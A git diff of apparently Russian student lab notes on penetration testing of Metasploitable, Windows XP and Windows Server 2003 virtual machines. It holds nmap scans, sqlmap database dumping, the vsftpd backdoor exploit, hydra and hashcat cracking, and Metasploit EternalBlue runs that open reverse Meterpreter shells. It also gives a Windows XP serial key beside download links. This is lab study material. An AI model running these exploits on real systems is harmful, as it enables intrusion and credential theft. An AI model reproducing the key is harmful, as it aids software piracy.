@@ -1,12 +1,15 @@
 # ЛР6
-
+## Download link
+* Link download metasploitable VM `https://sourceforge.net/projects/metasploitable/`
+* Link download `https://archive.org/details/WinXPSP2HomeProRUS`
+Serial: X3WJB-3B2BH-3MPM6-8F6GR-X9HBJ
+* Link download `https://archive.org/details/WindowsServer2003StandardEditionwithServicePack2x86Russian`
 ## nmap
 ```
 # scanning for open ports
 nmap -p- -O -sV 192.168.37.1/24
 -----------------------------------------------------------------------------------
 ## nmap-vulscan
-
 # installation
 cd /usr/share/nmap/scripts/
 git clone https://github.com/scipag/vulscan.git
@@ -29,7 +32,6 @@ nmap --script ssh-auth-methods $IP
 ```
 
 ## metasploitable
-* Link download metasploitable VM `https://sourceforge.net/projects/metasploitable/`
 * Metasploitable/SSH/Exploits
 `https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits`
 
@@ -95,9 +97,9 @@ sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1" — dbs
 sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1” -p id — tables -D gallery
 # dump all entries in the dev_account table:
 sqlmap -u “http://192.168.37.101/gallery/gallery.php?id=1" -p id -T dev_accounts –dump
-
+---
 OR 
-
+---
 http://192.168.37.101
 http://192.168.37.101/mutillidae/robots.txt
 http://192.168.37.101/mutillidae/passwords
@@ -116,11 +118,6 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.37.101
 RHOSTS => 192.168.37.101
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 
-[*] 192.168.37.101:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 192.168.37.101:21 - USER: 331 Please specify the password.
-[+] 192.168.37.101:21 - Backdoor service has been spawned, handling...
-[+] 192.168.37.101:21 - UID: uid=0(root) gid=0(root)
-[*] Found shell.
 [*] Command shell session 1 opened (192.168.37.105:45905 -> 192.168.37.101:6200) at 2022-11-24 20:44:32 +0300
 
 whoami
@@ -137,19 +134,25 @@ Retrieving passwords using NTLM + cracked LM hashes `https://github.com/ricardoj
 ```
 # using hydra for bruteforce-attack
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 41221
+-----------------------------------------------------------------------------------
 # using hashcat 
 sudo hashcat -a 0 -m 500 hashes.txt /usr/share/wordlists/rockyou.txt 
+-----------------------------------------------------------------------------------
 # using john the ripper
 # for meta
 john --format=md5crypt hashes.txt
 # for windows server
 john --format=LM 104.txt 
-
+-----------------------------------------------------------------------------------
+# using metasploit
+`https://www.darkoperator.com/blog/2011/5/19/metasploit-post-module-smart_hashdump.html`
+use /auxiliary/analyze/crack_windows
+use /auxiliary/analyze/jtr_windows_fast
 ```
 
 ## Windows XP
-* Link download `https://archive.org/details/WinXPSP2HomeProRUS`
-X3WJB-3B2BH-3MPM6-8F6GR-X9HBJ
+
+
 ### Opening ports
 
 ```
@@ -176,7 +179,7 @@ MAC Address: 00:0C:29:52:71:FE (VMware)
 Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
 ```
 ## Windows Server 2003
-* Link download `https://archive.org/details/WindowsServer2003StandardEditionwithServicePack2x86Russian`
+
 
 ### Opening ports
 ```
@@ -239,60 +242,6 @@ Exploit EternalBlue on Windows Server with Metasploit `https://null-byte.wonderh
 # ms17_010_psexec
 msf6 > use exploit/windows/smb/ms17_010_psexec
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
-msf6 exploit(windows/smb/ms17_010_psexec) > show options
-
-Module options (exploit/windows/smb/ms17_010_psexec):
-
-   Name                  Current Setting                                Required  Description
-   ----                  ---------------                                --------  -----------
-   DBGTRACE              false                                          yes       Show extra debug trace info
-   LEAKATTEMPTS          99                                             yes       How many times to try to leak transaction
-   NAMEDPIPE                                                            no        A named pipe that can be connected to (leave blank for auto)
-   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
-                         s/named_pipes.txt
-   RHOSTS                                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M
-                                                                                  etasploit
-   RPORT                 445                                            yes       The Target port (TCP)
-   SERVICE_DESCRIPTION                                                  no        Service description to to be used on target for pretty listing
-   SERVICE_DISPLAY_NAME                                                 no        The service display name
-   SERVICE_NAME                                                         no        The service name
-   SHARE                 ADMIN$                                         yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/wri
-                                                                                  te folder share
-   SMBDomain             .                                              no        The Windows domain to use for authentication
-   SMBPass                                                              no        The password for the specified username
-   SMBUser                                                              no        The username to authenticate as
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     127.0.0.1        yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(windows/smb/ms17_010_psexec) > show targets
-
-Exploit targets:
-
-   Id  Name
-   --  ----
-   0   Automatic
-   1   PowerShell
-   2   Native upload
-   3   MOF upload
-
 
 msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.37.104
 RHOSTS => 192.168.37.104
@@ -301,26 +250,6 @@ LHOST => 192.168.37.103
 msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4321
 LPORT => 4321
 msf6 exploit(windows/smb/ms17_010_psexec) > run
-
-[*] Started reverse TCP handler on 192.168.37.103:4321 
-[*] 192.168.37.104:445 - Target OS: Windows Server 2003 3790 Service Pack 2
-[*] 192.168.37.104:445 - Filling barrel with fish... done
-[*] 192.168.37.104:445 - <---------------- | Entering Danger Zone | ---------------->
-[*] 192.168.37.104:445 -        [*] Preparing dynamite...
-[*] 192.168.37.104:445 -                Trying stick 1 (x64)...Miss
-[*] 192.168.37.104:445 -                [*] Trying stick 2 (x86)...Boom!
-[*] 192.168.37.104:445 -        [+] Successfully Leaked Transaction!
-[*] 192.168.37.104:445 -        [+] Successfully caught Fish-in-a-barrel
-[*] 192.168.37.104:445 - <---------------- | Leaving Danger Zone | ---------------->
-[*] 192.168.37.104:445 - Reading from CONNECTION struct at: 0x8783e308
-[*] 192.168.37.104:445 - Built a write-what-where primitive...
-[+] 192.168.37.104:445 - Overwrite complete... SYSTEM session obtained!
-[*] 192.168.37.104:445 - Selecting native target
-[*] 192.168.37.104:445 - Uploading payload... ydmYWLsA.exe
-[*] 192.168.37.104:445 - Created \ydmYWLsA.exe...
-[+] 192.168.37.104:445 - Service started successfully...
-[*] 192.168.37.104:445 - Deleting \ydmYWLsA.exe...
-[*] Sending stage (175686 bytes) to 192.168.37.104
 [*] Meterpreter session 3 opened (192.168.37.103:4321 -> 192.168.37.104:1033) at 2022-11-28 12:36:30 +0300
 
 meterpreter > 
@@ -339,6 +268,32 @@ LPORT => 4321
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
+```
+
+### eternalblue_doublepulsar
+```
+For x86 XP SP1
+apt-get update -y
+apt-get upgrade -y
+apt-get install wine -y
+apt-get install winetricks -y
+dpkg –add-architecture i386 && apt-get update && apt-get install wine32 -y
+git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
+msf6 exploit(windows/smb/smb_doublepulsar_rce) > use /windows/smb/eternalblue_doublepulsar
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set LHOST 192.168.37.103
+LHOST => 192.168.37.103
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set RHOSTS 192.168.37.107
+RHOSTS => 192.168.37.107
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set TARGET 0
+TARGET => 0
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set DOUBLEPULSARPATH /home/hanh/Eternalblue-Doublepulsar-Metasploit/deps
+DOUBLEPULSARPATH => /home/hanh/Eternalblue-Doublepulsar-Metasploit/deps
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set ETERNALBLUEPATH /home/hanh/Eternalblue-Doublepulsar-Metasploit/deps
+ETERNALBLUEPATH => /home/hanh/Eternalblue-Doublepulsar-Metasploit/deps
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > set PROCESSINJECT explorer.exe
+PROCESSINJECT => explorer.exe
+msf6 exploit(windows/smb/eternalblue_doublepulsar) > run
+
 ```
 
 
